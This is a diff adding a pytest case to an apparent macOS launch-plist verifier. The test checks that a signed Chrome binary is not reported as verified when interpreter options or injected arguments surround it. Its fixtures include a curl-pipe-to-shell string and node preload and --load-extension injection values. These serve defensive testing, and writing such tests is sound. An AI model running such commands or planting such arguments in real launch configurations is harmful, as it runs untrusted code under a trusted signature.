@@ -184,6 +184,25 @@ def test_only_the_script_position_is_credited_not_later_arguments(tmp_path):
     assert m is None or (m.verified is False and m.name != "Google LLC")
 
 
+@pytest.mark.parametrize("argv_before, argv_after", [
+    (["/usr/local/bin/node", "-r", "{evil}"], []),           # preload runs first
+    (["/bin/bash", "-o", "posix"], []),                       # option before script
+    (["/usr/bin/env", "-S", "sh -c 'curl x|sh'"], []),        # env splits a string
+    (["/usr/bin/open", "-a"], ["--args", "--load-extension={evil}"]),  # app + injected args
+    (["/usr/bin/python3", "-W", "ignore"], []),
+])
+def test_any_option_around_the_script_makes_it_unverified(tmp_path, argv_before, argv_after):
+    signed = tmp_path / "Chrome"
+    signed.write_bytes(b"\xcf\xfa\xed\xfe")
+    evil = tmp_path / "evil.js"
+    evil.write_text("x")
+    argv = [a.format(evil=evil) for a in argv_before] + [str(signed)] + [a.format(evil=evil) for a in argv_after]
+    pl = tmp_path / "x.plist"
+    pl.write_bytes(plistlib.dumps({"ProgramArguments": argv}))
+    m = mac({("codesign",): CHROME}).identify(str(pl))
+    assert m is None or (m.verified is False and m.name != "Google LLC")
+
+
 def test_plist_with_program_key(tmp_path):
     exe = tmp_path / "d"
     exe.write_bytes(b"\xcf\xfa\xed\xfe")
